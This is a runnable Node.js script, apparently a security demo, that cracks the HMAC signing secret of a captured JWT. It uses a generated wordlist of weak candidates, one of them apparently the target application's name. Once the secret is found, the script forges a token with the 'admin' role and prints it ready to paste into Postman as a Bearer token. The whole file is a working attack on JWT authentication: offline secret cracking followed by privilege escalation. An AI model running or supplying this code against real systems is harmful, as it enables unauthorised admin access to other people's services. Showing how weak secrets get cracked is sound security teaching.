// Offline HMAC dictionary attack against a captured JWT's signing secret.
// Usage: node crack-jwt-demo.js "<paste captured accessToken here>"

const crypto = require('crypto');

const token = process.argv[2];
if (!token) {
  console.error('Usage: node crack-jwt-demo.js "<accessToken>"');
  process.exit(1);
}

function verifyHS256(t, secret) {
  const [h, p, sig] = t.split('.');
  const expected = crypto.createHmac('sha256', secret).update(`${h}.${p}`).digest('base64url');
  try {
    return crypto.timingSafeEqual(Buffer.from(sig), Buffer.from(expected));
  } catch {
    return false;
  }
}

function b64url(input) {
  return Buffer.from(input).toString('base64url');
}

function signJwtHS256(payload, secret) {
  const header = { alg: 'HS256', typ: 'JWT' };
  const h = b64url(JSON.stringify(header));
  const p = b64url(JSON.stringify(payload));
  const sig = crypto.createHmac('sha256', secret).update(`${h}.${p}`).digest('base64url');
  return `${h}.${p}.${sig}`;
}

function decodePayload(t) {
  const [, p] = t.split('.');
  return JSON.parse(Buffer.from(p, 'base64url').toString('utf8'));
}

function buildWordlist() {
  const prefixes = ['My', 'Our', 'Its', 'Thats', 'That', 'This', 'Super', 'Very', 'The'];
  const words = ['Secret', 'Password', 'Key', 'Auth', 'Token', 'Jwt'];
  const suffixes = ['', '1', '12', '123', '1234', '2024', '2025', '!'];
  const list = new Set(['secret', 'changeme', 'password', 'supersecret', 'eventguard', 'dev-secret']);
  for (const pre of prefixes) {
    for (const w of words) {
      for (const suf of suffixes) {
        list.add(`${pre}${w}${suf}`);
        list.add(`${pre}${w}${suf}`.toLowerCase());
      }
    }
  }
  return [...list];
}

console.log('Target token payload:', decodePayload(token));
console.log('\nStarting offline dictionary attack against the HS256 signature...\n');

const wordlist = buildWordlist();
console.log(`Loaded wordlist: ${wordlist.length} candidate secrets`);

const startedAt = new Date();
console.log(`Attack started at: ${startedAt.toISOString()}`);

let cracked = null;
const t0 = Date.now();
for (const candidate of wordlist) {
  if (verifyHS256(token, candidate)) {
    cracked = candidate;
    break;
  }
}
const elapsedMs = Date.now() - t0;

if (!cracked) {
  console.log(`\nFAILED to recover the secret after trying all ${wordlist.length} candidates (${elapsedMs}ms).`);
  process.exit(0);
}

console.log(`\n*** SECRET RECOVERED: "${cracked}" ***`);
console.log(`Elapsed time: ${elapsedMs}ms across ${wordlist.length} candidates`);

const payload = decodePayload(token);
const forged = signJwtHS256(
  { sub: payload.sub, role: 'admin', iat: Math.floor(Date.now() / 1000), exp: Math.floor(Date.now() / 1000) + 900 },
  cracked
);

console.log('\nForged admin-role token (paste this into Postman as a Bearer token):\n');
console.log(forged);
